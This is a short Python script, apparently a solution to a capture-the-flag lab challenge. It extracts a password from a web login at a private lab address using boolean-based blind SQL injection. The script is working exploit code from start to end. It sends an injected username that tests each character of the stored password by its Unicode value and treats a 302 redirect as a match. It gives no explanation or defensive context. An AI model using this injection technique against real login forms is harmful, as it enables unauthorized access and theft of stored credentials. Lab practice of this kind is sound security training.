import requests
import string
url = "http://10.10.244.194:5000/challenge3/login"
flag="THM{"
chars = string.ascii_letters+string.digits+'}'
counter = 5
while True:
    for char in chars:
        with requests.session() as sess:
            r = sess.post(url, data={
                "username":f"admin' and ((select unicode(substr(password,{counter},1)) from users limit 1)={ord(char)})--",
                "password":"tt"
            }, allow_redirects=False)
            if(r.status_code == 302):
                flag+=char
                counter+=1
                print(flag)
    if(len(flag) == 38):
        break
